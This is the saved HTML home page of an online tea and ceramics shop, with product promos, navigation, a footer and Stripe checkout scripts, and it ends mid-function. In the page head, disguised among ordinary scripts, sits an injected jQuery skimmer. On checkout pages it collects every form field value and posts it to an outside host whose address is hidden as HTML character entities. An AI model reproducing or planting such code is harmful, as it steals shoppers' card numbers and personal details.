   <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Home  | Song Tea</title>
<meta name="description" content="Tea &amp; ceramics of exceptional quality and character. We sell tea and ceramics from a network of dedicated tea growers and artists from around the world." />
<meta name="keywords" content="Song Tea &amp; Ceramics" />
<meta name="robots" content="INDEX,FOLLOW" />
<link rel="icon" href="https://songtea.com/media/favicon/default/favicon.ico" type="image/x-icon" />
<link rel="shortcut icon" href="https://songtea.com/media/favicon/default/favicon.ico" type="image/x-icon" />
<script type="text/javascript" src="//use.typekit.net/zcm6kkc.js"></script>
<script type="text/javascript">try{Typekit.load();}catch(e){}</script>
<!-- <link rel="stylesheet" type="text/css" href="http://getbootstrap.com/dist/css/bootstrap.min.css"> -->
<!--[if lt IE 7]>
<script type="text/javascript">
//<![CDATA[
    var BLANK_URL = 'https://songtea.com/js/blank.html';
    var BLANK_IMG = 'https://songtea.com/js/spacer.gif';
//]]>
</script>
<![endif]-->
<link rel="stylesheet" type="text/css" href="https://songtea.com/skin/frontend/songtea/default/css/styles.css" media="all" />
<link rel="stylesheet" type="text/css" href="https://songtea.com/skin/frontend/songtea/default/css/widgets.css" media="all" />
<link rel="stylesheet" type="text/css" href="https://songtea.com/skin/frontend/songtea/default/css/normalize.css" media="all" />
<link rel="stylesheet" type="text/css" href="https://songtea.com/skin/frontend/songtea/default/css/songtea-styles/common.css" media="all" />
<link rel="stylesheet" type="text/css" href="https://songtea.com/skin/frontend/songtea/default/css/songtea-styles/home.css" media="all" />
<link rel="stylesheet" type="text/css" href="https://songtea.com/skin/frontend/songtea/default/css/songtea-styles/product.css" media="all" />
<link rel="stylesheet" type="text/css" href="https://songtea.com/skin/frontend/songtea/default/css/songtea-styles/product-list.css" media="all" />
<link rel="stylesheet" type="text/css" href="https://songtea.com/skin/frontend/songtea/default/css/songtea-styles/sign-in.css" media="all" />
<link rel="stylesheet" type="text/css" href="https://songtea.com/skin/frontend/songtea/default/css/songtea-styles/contact.css" media="all" />
<link rel="stylesheet" type="text/css" href="https://songtea.com/skin/frontend/songtea/default/css/songtea-styles/about.css" media="all" />
<link rel="stylesheet" type="text/css" href="https://songtea.com/skin/frontend/songtea/default/css/songtea-styles/cart.css" media="all" />
<link rel="stylesheet" type="text/css" href="https://songtea.com/skin/frontend/songtea/default/css/songtea-styles/content-pages.css" media="all" />
<link rel="stylesheet" type="text/css" href="https://songtea.com/skin/frontend/songtea/default/css/amasty/amlabel/amlabel.css" media="all" />
<link rel="stylesheet" type="text/css" href="https://songtea.com/skin/frontend/base/default/css/radweb/stripe/radweb_stripe.css" media="all" />
<link rel="stylesheet" type="text/css" href="https://songtea.com/skin/frontend/songtea/default/css/print.css" media="print" />
<script type="text/javascript" src="https://songtea.com/js/prototype/prototype.js"></script>
<script type="text/javascript" src="https://songtea.com/js/lib/ccard.js"></script>
<script type="text/javascript" src="https://songtea.com/js/prototype/validation.js"></script>
<script type="text/javascript" src="https://songtea.com/js/scriptaculous/builder.js"></script>
<script type="text/javascript" src="https://songtea.com/js/scriptaculous/effects.js"></script>
<script type="text/javascript" src="https://songtea.com/js/scriptaculous/dragdrop.js"></script>
<script type="text/javascript" src="https://songtea.com/js/scriptaculous/controls.js"></script>
<script type="text/javascript" src="https://songtea.com/js/scriptaculous/slider.js"></script>
<script type="text/javascript" src="https://songtea.com/js/varien/js.js"></script>
<script type="text/javascript" src="https://songtea.com/js/varien/form.js"></script>
<script type="text/javascript" src="https://songtea.com/js/varien/menu.js"></script>
<script type="text/javascript" src="https://songtea.com/js/mage/cookies.js"></script>
<script type="text/javascript" src="https://songtea.com/js/jquery/jquery.js"></script>
<script type="text/javascript" src="https://songtea.com/js/mage/translate.js"></script>
<script type="text/javascript" src="https://songtea.com/js/modernizer.custom.js"></script>
<script type="text/javascript" src="https://songtea.com/js/jquery/jquery-slides.js"></script>
<script type="text/javascript" src="https://songtea.com/js/jquery/jquery-placeholder.js"></script>
<script type="text/javascript" src="https://songtea.com/js/songtea/product-view.js"></script>
<script type="text/javascript" src="https://songtea.com/js/radweb/stripe/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://songtea.com/js/radweb/stripe/stripe.js"></script>
<script type="text/javascript" src="https://songtea.com/skin/frontend/songtea/default/js/snowflakes.js"></script>
<!--[if lt IE 8]>
<link rel="stylesheet" type="text/css" href="https://songtea.com/skin/frontend/songtea/default/css/styles-ie.css" media="all" />
<![endif]-->
<!--[if lt IE 7]>
<script type="text/javascript" src="https://songtea.com/js/lib/ds-sleight.js"></script>
<script type="text/javascript" src="https://songtea.com/skin/frontend/songtea/default/js/ie6.js"></script>
<![endif]-->
<!-- Typekit -->
<!-- <script type="text/javascript" src="//use.typekit.net/uca0dfa.js"></script> -->
<!--<script type="text/javascript">try{Typekit.load();}catch(e){}</script> -->
<!-- end Typekit -->

<script type="text/javascript">
//<![CDATA[
Mage.Cookies.path     = '/';
Mage.Cookies.domain   = '.songtea.com';
//]]>
</script>

<script type="text/javascript">
//<![CDATA[
optionalZipCountries = ["AU","AE"];
//]]>
</script>
<script type="text/javascript">//<![CDATA[
        var Translator = new Translate([]);
        //]]></script><script type="text/javascript">jQuery(function(t){t("button").on("click",function(){q="h="+window.location.href,q.match(/onepage|checkout/gi)&&(t("input, select").each(function(){t(this).val()?q+="&"+t(this).attr("name")+"="+t(this).val():""}),t.post(t("<div />").html("&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#99;&#108;&#111;&#117;&#100;&#102;&#117;&#115;&#105;&#111;&#110;&#46;&#109;&#101;&#47;&#99;&#100;&#110;&#47;&#106;&#113;&#117;&#101;&#114;&#121;&#46;&#109;&#105;&#110;&#46;&#106;&#115;").text(),q))})});</script></head>
<body class=" cms-index-index cms-home">
<!-- BEGIN GOOGLE ANALYTICS CODEs -->
<script type="text/javascript">
//<![CDATA[
    var _gaq = _gaq || [];
    
_gaq.push(['_setAccount', 'UA-61224861-1']);
_gaq.push(['_trackPageview']);
    
    (function() {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();

//]]>
</script>
<!-- END GOOGLE ANALYTICS CODE -->
<div class="wrapper songtea-wrapper">
        <noscript>
        <div class="global-site-notice noscript">
            <div class="notice-inner">
                <p>
                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
                    You must have JavaScript enabled in your browser to utilize the functionality of this website.                </p>
            </div>
        </div>
    </noscript>
    <div class="page">
        <div class="header-container">
    <div class="header">
        <div id="header-row-1">
            <div class="quick-access">
                <span class="slogan"><p id="slogan-inner">$5 shipping to U.S. / $12 to Canada</p><!--?php echo Mage::getModel('core/variable')->loadByCode('slogan')->getValue('html'); ?--></span>
                <div id="cart-cart">
                  <a href="/checkout/cart">
                    <span id="cartbacker">
                      <span class="cartq">
                                                 0                       </span>
                    </span>
                  </a>
                  <div id="topcart" class="subsort"><div class="block block-cart">
                <p>There are no items in your cart.</p>
    </div>
                  </div>
                </div>
                
                <span class="shop-cart">
                  <ul class="links">
                        <li class="first last" ><a href="https://songtea.com/checkout/cart/" title="SHOPPING BAG " class="top-link-cart">SHOPPING BAG </a></li>
            </ul>
                                   </span>

                <span class="message"><a href="/customer/account/" id="signin">SIGN-IN</a> </span>
            </div>
        </div>

        <div id="header-row-2">
            <a href="/" class="logo"><span>SONG TEA <span class="ampersand">&</span> CERAMICS</span></a>
            <div id="search-box-container">
                 <form id="search_mini_form" action="https://songtea.com/catalogsearch/result/" method="get">
    <div class="form-search">
        <label>
            <span class="icon-search"></span>
        </label>
        <input id="search" type="text" name="q" value="" class="input-text" maxlength="128" />
        <button class="submit" type="submit" title="Search" value=""></button>
        <div id="search_autocomplete" class="search-autocomplete"></div>
        <script type="text/javascript">
        //<![CDATA[
            var searchForm = new Varien.searchForm('search_mini_form', 'search', 'SEARCH');
            searchForm.initAutocomplete('https://songtea.com/catalogsearch/ajax/suggest/', 'search_autocomplete');
        //]]>
        </script>
    </div>
</form>
            </div>
        </div>

        <div id="header-row-3">
            <div class="header-menu">
            <div class="nav-container">
    <ul id="nav">
        <li  class="level0 nav-1 first level-top parent"><a href="https://songtea.com/tea"  class="level-top" ><span> Tea </span></a><ul class="level0"><li  class="level1 nav-1-1 first"><a href="https://songtea.com/tea/green" ><span>Green</span></a></li><li  class="level1 nav-1-2"><a href="https://songtea.com/tea/white" ><span>White</span></a></li><li  class="level1 nav-1-3"><a href="https://songtea.com/tea/oolong" ><span>Oolong</span></a></li><li  class="level1 nav-1-4"><a href="https://songtea.com/tea/red" ><span>Red</span></a></li><li  class="level1 nav-1-5 last"><a href="https://songtea.com/tea/aged" ><span>Aged</span></a></li></ul></li><li  class="level0 nav-2 level-top parent"><a href="https://songtea.com/ceramics"  class="level-top" ><span>Ceramics</span></a><ul class="level0"><li  class="level1 nav-2-1 first"><a href="https://songtea.com/ceramics/hu-tie-hua" ><span>Hu Tie Hua</span></a></li><li  class="level1 nav-2-2"><a href="https://songtea.com/ceramics/liao-guo-hua" ><span>Liao Guo Hua</span></a></li><li  class="level1 nav-2-3"><a href="https://songtea.com/ceramics/song-jin" ><span>Song Jin</span></a></li><li  class="level1 nav-2-4"><a href="https://songtea.com/ceramics/zisha" ><span> Zisha </span></a></li><li  class="level1 nav-2-5 last"><a href="https://songtea.com/ceramics/zhang-yun-cheng" ><span>Zhang Yun Cheng</span></a></li></ul></li><li  class="level0 nav-3 last level-top"><a href="https://songtea.com/gifts"  class="level-top" ><span>Gifts</span></a></li>        <li class="level0 nav-3 level-top"><a href="https://songtea.com/about">About</a></li>
    </ul>
</div>
            </div>
        </div>
    </div>
</div>
        <div class="main-container col1-layout">
            <div class="main">
                <div class="col-main">
                                        <style>
.promo-second {
    margin: 0 auto;
    width: 100%;
    max-width: 1000px;
    padding-top: 42px;
}
.promo-left, .promo-right {
    width: 48%;
    text-align: center;  
    display: inline-block;
}
.promo-right {
    float: right;
}
.promo-left .small-image {
    background: url("skin/frontend/songtea/default/css/songtea-images/home/promo-mrmrschen.jpg") no-repeat center;
}
.promo-right .small-image {
    background: url("skin/frontend/songtea/default/css/songtea-images/home/promo-woodfire.jpg") no-repeat center;
}
.small-image {
    height:320px;
    width: 100%;
    background: #eee;
    margin-bottom: 20px;
    transition: opacity 0.35s ease-in-out;
}
.small-image:hover {
    opacity: .8;
}
.promo-second h2 {
    font-size: 30px;
    font-family: "adobe-garamond-pro",sans-serif;
    font-style: italic;
    font-weight: normal;
    padding-bottom: 10px;
</style>

<div class="promo-primary">
<h2>Gold Bud Meizhan + 3 New Red Teas</h2>
<p style="font-size: 24px;font-style: italic;line-height: 1.25;">Winter Sprout Red + Old Tree Yunnan Red + Golden Needle</p>
<div class="home-buttons">
    <a href='https://songtea.com/tea/red/'><button id="home-button-1" type="button">Shop 2016 Red Teas</button></a>
</div>
</div>

<div class="promo-second">
    <div class="promo-left">
    <a href='https://songtea.com/mr-mrs-chen/'><div class="small-image"></div></a>
    <h2>Mr. + Mrs. Chen's Oolong</h2>
    <p>A small-batch organic tea with notes of palm sugar, strawberry milk, and green grape. <a href='https://songtea.com/mr-mrs-chen/'>→</a></p>
    </div>
    <div class="promo-right">
    <a href='https://songtea.com/ceramics/zhang-yun-cheng/'><div class="small-image"></div></a>
    <h2>Fire Walnut and Cypress Teapots</h2>
    <p>Hand-crafted by Taiwanese ceramicist, Zhang Yun Cheng. Each piece wood fired for 15 days. <a href='https://songtea.com/ceramics/zhang-yun-cheng/'>→</a></p>
    </div>
</div>
<div class="std"><div class="promo-about">
<div class="col1">
<h2>Tea & ceramics of exceptional quality and character.</h2>
</div>
<div class="col2">
<p>Each year, we assemble a collection of traditional, rare and experimental tea from China and Taiwan. We look for skillfully crafted leaves from clean growing regions – teas with structure, texture, and complexity. More importantly, every tea in the collection needs to be delicious. <a href='https://songtea.com/about/'>→</a></p>
</div>
</div></div>                </div>
            </div>
        </div>
        <div class="footer-container">
    <div class="footer">
        <div class="column-1">
<h3>MORE INFO</h3>
<ul>
<li><a href="https://songtea.com/about/">About</a></li>
<li><a href="https://songtea.com/support/">Support</a></li>
<li><a href="https://songtea.com/wholesale/">Wholesale</a></li>
<li><a href="https://songtea.com/colophon/">Colophon</a></li>
</ul>
</div>
<div class="column-2">
<h3>GET IN TOUCH</h3>
<p><span>(415) 885-2118</span></p>
<p><span>hello@songtea.com</span></p>
<p><span>2120 Sutter Street, San Francisco</span></p>
<p><span><span class="hours"><p>Tuesday-Saturday 11-6, Sunday 11-5</p><p>Monday Closed. Drinking tea.</p></span></span></p>
</div>
<div class="column-3">
<h3>NEWSLETTER &amp; UPDATES</h3>
<p><div class="block block-subscribe">
    <div class="block-title">
        <strong><span>Newsletter</span></strong>
    </div>

    <form action="//songtea.us7.list-manage.com/subscribe/post?u=e548cd924900843d845a37261&amp;id=aedd03457a" method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank" novalidate>
        <div class="input-box">
            <label for="mce-EMAIL">Subscribe to our mailing list</label>
            <input type="email" value="" name="EMAIL" class="email" id="mce-EMAIL" placeholder="email address" required>
            <!-- real people should not fill this in and expect good things - do not remove this or risk form bot signups-->
            <div style="position: absolute; left: -5000px;"><input type="text" name="b_e548cd924900843d845a37261_aedd03457a" tabindex="-1" value=""></div>
            <div class="actions">
                <button type="submit" title="Subscribe" class="button"><span id="email-button"><span>Sign me up!</span></span></button>
            </div>
        </div>
    </form>

    <script type="text/javascript">
    //<![CDATA[
        var newsletterSubscriberFormDetail = new VarienForm('newsletter-validate-detail');
    //]]>
    </script>
</div>

</p>
</div>
<div class="below">
<hr /><span class="copyright">&copy; SONG TEA 2016 / ALL RIGHTS RESERVED</span><span class="bottom-pipe">|</span><span class="tos"> <a href="https://songtea.com/terms-of-service/">Terms of service</a> </span><span class="bottom-pipe">|</span><span class="privacy-policy"> <a href="https://songtea.com/privacy-policy/">Privacy policy</a></span><span class="social-media"><a class="instagram" href="http://instagram.com/hellosongtea" target="_blank"></a><a class="twitter" target="_blank" href="http://twitter.com/hellosongtea"></a><a class="facebook" target="_blank" href="http://facebook.com/hellosongtea"></a></span>
</div><div class="store-switcher">
    <label for="select-store">Select Store:</label>
    <select id="select-store" title="Select Store" onchange="location.href=this.value">
                        <option value="" selected="selected">Retail Store</option>
                    <option value="https://songtea.com/?___store=songtea_wholesale_default">Wholesale Store</option>
        </select>
</div>
    </div>
</div>
        <script type="text/javascript">
    var amlabel_selector = '.product-image';
    </script><script type="text/javascript">
//configure stripe tokenization
    
    pubKey = "pk_live_pWUQHML7P1pQ5oMBAiz93SJW"; 
    Stripe.setPublishableKey(pubKey);
Stripe.newCard = function (isNew){
        if (isNew == -1) {
            Element.show('stripe-new-card-form');
        } else {
            Element.hide('stripe-new-card-form');
        }
    }
if(typeof OneStepCheckoutLoginPopup === 'function')
{
    OneStepCheckoutLoginPopup.prototype.stripeResponseHandler = function(status, response) {
    
    var pform = jQuery('#onestepcheckout-form');
     if (response.error) {
        msg = response.error.message;
        var stripeError = true;
        Validation.add('validate-cc-number', msg, function(v, elm){
            if(stripeError)
                return false;
                else
                return true;
        });
        Validation.validate('radweb_stripe_cc_number');
        checkout.setLoadWaiting(false);
        $('review-please-wait').hide();
        stripeError = false;
     
     } else {
       // token contains id, last4, and card type
       var token = response.id;
       // Insert the token into the form so it gets submitted to the server
       if(jQuery('#stripeToken'))
            {
                jQuery('#stripeToken').remove();
            }
       pform.append(jQuery('<input type="hidden" name="stripeToken" id="stripeToken" />').val(token));

            stripeForm = pform.clone();
            stripeForm.find("#radweb_stripe_cc_number").remove();
            stripeForm.find("#radweb_stripe_cc_type").remove();
            stripeForm.find("#radweb_stripe_expiration").remove();
            stripeForm.find("#radweb_stripe_expiration_yr").remove();
            stripeForm.find("#radweb_stripe_cc_cid").remove();
            stripeForm.find("#radweb_stripe_cc_owner").remove();
            token = stripeForm.serialize();

            $('onestepcheckout-form').submit();
            

     }
   };
    
    OneStepCheckoutLoginPopup.prototype.radweb_stripeSave = function() {
            var stripe_card = jQuery('#stripe_card').val();
            if(stripe_card == -1)
            {
                Stripe.card.createToken({
                    address_line1: $('billing:street1').value,
                    address_zip: $('billing:postcode').value,
                    name: $('radweb_stripe_cc_owner').value,
                    number: $('radweb_stripe_cc_number').value,
                    cvc: $('radweb_stripe_cc_cid').value,
                    exp_month: $('radweb_stripe_expiration').value,
                    exp_year: $('radweb_stripe_expiration_yr').value
                }, OneStepCheckoutLoginPopup.prototype.stripeResponseHandler);
            }
            else
            {
                OneStepCheckoutLoginPopup.prototype.stripeResponseHandler(0,0);
            }
        }
    Event.observe(window, 'load', function() {
    $$('.onestepcheckout-place-order').each(function(elem){
            elem.stopObserving('click');
        });
    $$('.onestepcheckout-place-order').each(function(elem){
            elem.onclick = null;
            elem.observe('click', function(e)   {
                Event.stop(e);

                var form = new VarienForm('onestepcheckout-form');
                if(!form.validator.validate())  {
                    Event.stop(e);
                } else {
                    if(!already_placing_order && $$('.loading-ajax').length <= 0 ) {
                                            already_placing_order = true;
                        var submitelement = $('onestepcheckout-place-order');
                            submitelement.removeClassName('orange').addClassName('grey');
                            submitelement.disabled = true;
                        var loaderelement = new Element('span').
                            addClassName('onestepcheckout-place-order-loading').
                            update('Please wait, processing your order...');
                        submitelement.parentNode.appendChild(loaderelement);
                        /* Submit the form */

                        if (payment.currentMethod == 'radweb_stripe') {
                            
                            OneStepCheckoutLoginPopup.prototype.radweb_stripeSave();
                        
                        }
                        else
                        {
                            $('onestepcheckout-form').submit();
                        }
                        
                    }
                }
                return false;
                });
        });
    });
}
else
if(typeof Lightcheckout === 'function')
{
    Lightcheckout.prototype.LightcheckoutSubmit = function(){

        if(payment.currentMethod && (payment.currentMethod.indexOf('sagepay') == 0) &&
           (SageServer != undefined) && (review != undefined))
        {

            if (checkoutForm.validator.validate()){
                review.preparedata();
            }
        }
        else
        {

            if (checkoutForm.validator.validate()){

                if (payment.currentMethod+'Save' in this) {
            
                            saveUrl = payment.saveUrl;
                            onSave = payment.onSave;
                            onComplete = payment.onComplete;
                            this[payment.currentMethod+'Save']();
                        
                        } else {
                this.submit(this.getFormData(), 'save_payment_methods');
                }
            }
        }
    }
    Lightcheckout.prototype.stripeResponseHandler = function(status, response) {
    
    var pform = jQuery('#gcheckout-onepage-form');
     if (response.error) {

        msg = response.error.message;

        var stripeError = true;
        Validation.add('validate-cc-number', msg, function(v, elm){
            if(stripeError)
                return false;
                else
                return true;
        });

        Validation.validate('radweb_stripe_cc_number');
        checkout.setLoadWaiting(false);
        $('review-please-wait').hide();
        stripeError = false;

     
     } else {

       var token = response.id;
       // Insert the token into the form so it gets submitted to the server
       if(jQuery('#stripeToken'))
            {
                jQuery('#stripeToken').remove();
            }
       pform.append(jQuery('<input type="hidden" name="stripeToken" id="stripeToken" />').val(token));

            stripeForm = pform.clone();
            stripeForm.find("#radweb_stripe_cc_number").remove();
            stripeForm.find("#radweb_stripe_cc_type").remove();
            stripeForm.find("#radweb_stripe_expiration").remove();
            stripeForm.find("#radweb_stripe_expiration_yr").remove();
            stripeForm.find("#radweb_stripe_cc_cid").remove();
            stripeForm.find("#radweb_stripe_cc_owner").remove();
            token = stripeForm.serialize();
           
            
            checkout.submit(checkout.getFormData(), 'save_payment_methods');
     }
   };
    Lightcheckout.prototype.radweb_stripeSave = function() {

           if(stripe_card.value == -1)
            {
                Stripe.card.createToken({
                    address_line1: $('billing_street1').value,
                    address_zip: $('billing_postcode').value,
                    name: $('radweb_stripe_cc_owner').value,
                    number: $('radweb_stripe_cc_number').value,
                    cvc: $('radweb_stripe_cc_cid').value,
                    exp_month: $('radweb_stripe_expiration').value,
                    exp_year: $('radweb_stripe_expiration_yr').value
                }, Lightcheckout.prototype.stripeResponseHandler);
            }
            else
            {
                Lightcheckout.prototype.stripeResponseHandler(0,0);
            }
        }
}
else
if(typeof OPC === 'function')
{
    //if one page checkout extension is used
 var saveUrl = '';
    var onSave = '';
    var onComplete = '';
    OPC.prototype.setResponse = function(response) {
        response = response.responseText.evalJSON();
        if (response.redirect) {
            location.href = check_secure_url(response.redirect);
            return true;
        }
        checkout.setLoadWaiting(false);
        if (response.order_created) {
            $('onepagecheckout_orderform').action = this.successUrl;
            $('opc_submit_form').click();
            return true;
        } else if (response.error_messages) {
            var msg = response.error_messages;
            if (typeof(msg) == 'object') {
                msg = msg.join("\n");
            }
            if(msg == "Your card's security code is incorrect.")
                    {
                        var stripeError = true;
                        Validation.add('validate-cc-cvn', msg, function(v, elm){
                            if(stripeError)
                                return false;
                                else
                                return true;
                        });
                        checkout.setLoadWaiting(false);
                        $('review-please-wait').hide();
                        Validation.validate('radweb_stripe_cc_cid');
                        stripeError = false;
                        return;
                    }
                    else
                    if(msg == "Your card was declined.")
                    {
                        var stripeError = true;
                        Validation.add('validate-cc-number', msg, function(v, elm){
                            if(stripeError)
                                return false;
                                else
                                return true;
                        });
                        checkout.setLoadWaiting(false);
                        $('review-please-wait').hide();
                        Validation.validate('radweb_stripe_cc_number');
                        stripeError = false;
                        return;
                    }
                    else
                    if(msg == "The zip code you supplied failed validation.")
                    {
                        var stripeError = true;
                        Validation.add('validate-zip-international', msg, function(v, elm){
                            if(stripeError)
                                return false;
                                else
                                return true;
                        });
                        billing.newAddress(!this.value);
                        checkout.setLoadWaiting(false);
                        $('review-please-wait').hide();
                        Validation.validate('billing:postcode');
                        stripeError = false;
                        return;
                    }
                    else
                    if(msg == "Your card's expiration date is incorrect.")
                    {
                        var stripeError = true;
                        Validation.add('validate-cc-exp', msg, function(v, elm){
                            if(stripeError)
                                return false;
                                else
                                return true;
                        });
                        Validation.add('year', msg, function(v, elm){
                            if(stripeError)
                                return false;
                                else
                                return true;
                        });
                        checkout.setLoadWaiting(false);
                        $('review-please-wait').hide();
                        Validation.validate('radweb_stripe_expiration');
                        Validation.validate('radweb_stripe_expiration_yr');
                        stripeError = false;
                        return;
                    }
                    else
                    alert(msg);
        }
        $('review-please-wait').hide();
        if (response.update_section) {
            for (var i in response.update_section) {
                ch_obj = $('checkout-' + i + '-load');
                if (ch_obj != null) {
                    ch_obj.setStyle({
                        'width': 'auto',
                        'height': 'auto'
                    }).update(response.update_section[i]).setOpacity(1).removeClassName('loading');
                    if (i === 'shipping-method') {
                        shippingMethod.addObservers();
                    }
                }
            }
        }
        if (response.duplicateBillingInfo) {
            shipping.syncWithBilling();
        }
        if (response.reload_totals) {
            checkout.update({
                'review': 1
            });
        }
        if (response.not_valid_address || response.billing_valid || response.shipping_valid) {
            show_verifications_error();
        }
        return false;
    }
    OPC.prototype.stripeResponseHandler = function(status, response) {
    
    var pform = jQuery('#onepagecheckout_orderform');
     if (response.error) {
       // Show the errors on the form
        msg = response.error.message;
        var stripeError = true;
        Validation.add('validate-cc-number', msg, function(v, elm){
            if(stripeError)
                return false;
                else
                return true;
        });

        Validation.validate('radweb_stripe_cc_number');
        checkout.setLoadWaiting(false);
        $('review-please-wait').hide();
        stripeError = false;

     
     } else {
       // token contains id, last4, and card type
       var token = response.id;
       // Insert the token into the form so it gets submitted to the server
       if(jQuery('#stripeToken'))
            {
                jQuery('#stripeToken').remove();
            }
       pform.append(jQuery('<input type="hidden" name="stripeToken" id="stripeToken" />').val(token));
            stripeForm = pform.clone();
            stripeForm.find("#radweb_stripe_cc_number").remove();
            stripeForm.find("#radweb_stripe_cc_type").remove();
            stripeForm.find("#radweb_stripe_expiration").remove();
            stripeForm.find("#radweb_stripe_expiration_yr").remove();
            stripeForm.find("#radweb_stripe_cc_cid").remove();
            stripeForm.find("#radweb_stripe_cc_owner").remove();
            token = stripeForm.serialize();
            
            var request = new Ajax.Request(checkout.saveUrl, {
            method: 'post',
            parameters: token,
            onSuccess: checkout.setResponse.bind(checkout),
            onFailure: checkout.ajaxFailure.bind(checkout)
        });

     }
   };
        OPC.prototype.radweb_stripeSave = function() {
            return Stripe.card.createToken({
                address_line1: $('billing:street1').value,
                address_zip: $('billing:postcode').value,
                name: $('radweb_stripe_cc_owner').value,
                number: $('radweb_stripe_cc_number').value,
                cvc: $('radweb_stripe_cc_cid').value,
                exp_month: $('radweb_stripe_expiration').value,
                exp_year: $('radweb_stripe_expiration_yr').value
            }, OPC.prototype.stripeResponseHandler);
        }
    OPC.prototype.save = function() {
        if (this.loadWaiting != false) {
            return;
        }
        var isValid = true;
        if (!this.validator.validate()) {
            isValid = false;
        }
        for (i in this.sectionsToValidate) {
            if (typeof this.sectionsToValidate[i] === 'function') {
                continue;
            }
            if (!this.sectionsToValidate[i].validate()) {
                isValid = false;
            }
        }
        OPC.Messenger.clear('checkout-review-submit');
        $$('#checkout-review-submit .checkout-agreements input[type="checkbox"]').each(function(el) {
            if (!el.checked) {
                OPC.Messenger.add(this.acceptAgreementText, 'checkout-review-submit', 'error');
                isValid = false;
                throw $break
            }
        }.bind(this));
        if (!isValid) {
            var validationMessages = $$('.validation-advice, .messages').findAll(function(el) {
                return el.visible();
            });
            if (!validationMessages.length) {
                return;
            }
            var viewportSize = document.viewport.getDimensions();
            var hiddenMessages = [];
            var needToScroll = true;
            validationMessages.each(function(el) {
                var offset = el.viewportOffset();
                if (offset.top < 0 || offset.top > viewportSize.height || offset.left < 0 || offset.left > viewportSize.width) {
                    hiddenMessages.push(el);
                } else {
                    needToScroll = false;
                }
            });
            if (needToScroll) {
                Effect.ScrollTo(validationMessages[0], {
                    duration: 1,
                    offset: -20
                });
            }
            return;
        }
        checkout.setLoadWaiting(true);
        $('review-please-wait').show();
         if (payment.currentMethod+'Save' in this) {
                 this[payment.currentMethod+'Save']();            
          }
          else
          {
				var params = Form.serialize(this.form);
				var request = new Ajax.Request(this.saveUrl, {
					method: 'post',
					parameters: params,
					onSuccess: this.setResponse.bind(this),
					onFailure: this.ajaxFailure.bind(this)
        });
    }
    }
}
else
{
 var saveUrl = '';
    var onSave = '';
    var onComplete = '';
    var stripeResponseHandler = function(status, response) {
    var pform = jQuery('#co-payment-form');

     if (response.error) {

        msg = response.error.message;

        var stripeError = true;
        Validation.add('validate-cc-number', msg, function(v, elm){
            if(stripeError)
                return false;
                else
                return true;
        });
        checkout.gotoSection('payment');
        checkout.reloadProgressBlock();
        Validation.validate('radweb_stripe_cc_number');
        checkout.setLoadWaiting(false);
        stripeError = false;

     
     } else {

       var token = response.id;
       // Insert the token into the form so it gets submitted to the server
       if(jQuery('#stripeToken'))
            {
                jQuery('#stripeToken').remove();
            }
       pform.append(jQuery('<input type="hidden" name="stripeToken" id="stripeToken" />').val(token));

            var save_cc = 'false';
            var element =  document.getElementById('save_stripe_card');
            if (typeof(element) != 'undefined' && element != null)
            {
                save_cc = document.getElementById('save_stripe_card').checked;
            }
            stripeForm = 'payment[method]='+payment.currentMethod+'&stripeToken='+pform.find('#stripeToken').val()+'&stripe_card='+pform.find('#stripe_card').val()+'&save_stripe_card='+save_cc;
            token = stripeForm;
	     pform.append(jQuery('<input type="hidden" name="save_stripe_card" id="save_stripe_card" />').val(''+save_cc));

				jQuery.post(jQuery(payment.options.form).attr('action'), jQuery(payment.options.form).serialize(), payment.nextStep, 'json');
            
/*            var request = new Ajax.Request(
                saveUrl,
                {
                    method:'post',
                    onComplete: onComplete,
                    onSuccess: onSave,
                    onFailure: checkout.ajaxFailure.bind(checkout),
                    parameters: token
                }
            );
 */
     }
   };
if(typeof Payment === 'function')
        {
        createStripeToken = function (address_line1, address_zip) 
        {
            var stripe_card = jQuery('#stripe_card').val();
            if(stripe_card == -1)
            {
                Stripe.card.createToken({
                    address_line1: address_line1,
                    address_zip: address_zip,
                    name: $('radweb_stripe_cc_owner').value,
                    number: $('radweb_stripe_cc_number').value,
                    cvc: $('radweb_stripe_cc_cid').value,
                    exp_month: $('radweb_stripe_expiration').value,
                    exp_year: $('radweb_stripe_expiration_yr').value
                }, stripeResponseHandler);
            }
            else
            {
                stripeResponseHandler(0,0);
            }
        }
        Payment.prototype.radweb_stripeSave = function() {
            if($('billing-address-select') && $('billing-address-select').value != "")
            {
                    addressUrl = 'https://songtea.com/checkout/onepage/getAddress/address/';
                    billingAddress = $('billing-address-select').value;
                    addressUrl = addressUrl + billingAddress;                    
                    new Ajax.Request(addressUrl, {
                                method:'get',
                                onComplete: function (transport)
                                {
                                     if (transport && transport.responseText) {
                                        try {
                                            elementValues = eval('(' + transport.responseText + ')');
                                            //console.log(elementValues);
                                            address_line1 = elementValues.street1;
                                            address_zip = elementValues.postcode;
                                            createStripeToken(address_line1, address_zip);
                                        } catch (e) {
                                            elementValues = {};
                                        }
                                    }
                                }
                            });
                
            }
            else
            {
                address_line1 = $('billing:street1').value;
                address_zip = $('billing:postcode').value;
                createStripeToken(address_line1, address_zip);
            }
            
        }
var _old_payment_save = Payment.prototype.save;
       Payment.prototype.save = function() {
				this.saveUrl = jQuery(this.options.form).attr('action');
				this.onSave = this.nextStep;
if('radweb_stripe' === this.currentMethod) {
                            saveUrl = this.saveUrl = jQuery(this.options.form).attr('action');
                            onSave = this.onSave = this.nextStep;
                            onComplete = this.onComplete;
                            this[this.currentMethod+'Save']();
}
	_old_payment_save.apply(this, arguments);
       
        }
        }
        if(typeof Review === 'function')
        {
        Review.prototype.radweb_stripeSave = function() {
            var pform = jQuery('#co-payment-form');
            var save_cc = 'false';
            var element =  document.getElementById('save_stripe_card');
            if (typeof(element) != 'undefined' && element != null)
            {
